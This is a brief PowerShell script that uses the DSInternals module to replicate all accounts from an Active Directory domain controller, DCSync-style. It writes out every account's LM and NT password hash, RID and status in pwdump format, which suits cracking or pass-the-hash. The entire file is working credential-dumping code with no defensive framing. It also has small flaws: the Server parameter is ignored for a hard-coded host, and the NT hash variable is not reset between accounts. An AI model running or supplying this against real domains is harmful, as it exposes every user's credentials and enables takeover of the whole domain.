Import-Module .\DSInternals\DSInternals.psd1
function Get-Hashes{
param (
       [Parameter(Mandatory=$true)] [String] $Server
    )
    $DCSync = Get-ADReplAccount -All -Server dc01.contoso.local
    $DCSync | ForEach-Object {if ($_.nthash){$nthash=[string]::join('',(convertto-hex -input $_.nthash))};if ($_.lmhash){$lmhash = [string]::join('',(convertto-hex -input $_.lmhash))}else{$lmhash = "aad3b435b51404eeaad3b435b51404ee"};$DN = ($_.DistinguishedName -split "DC="| Where{ $_ -notmatch "^CN="}).replace(",","");foreach ($line in $DN){$domain = $domain+$line +".";}$domain=$domain.substring(0,$domain.length-1);$rid = $_.sid.value.substring($_.sid.value.lastindexof('-')+1);$samaccountname= $_.samaccountname; if ($_.enabled){$status = "Enabled"}else{$status="Disabled"};Write-output "$domain\$samaccountname`:$rid`:$lmhash`:$nthash`:`:`: (status=$status)";$domain="";}
}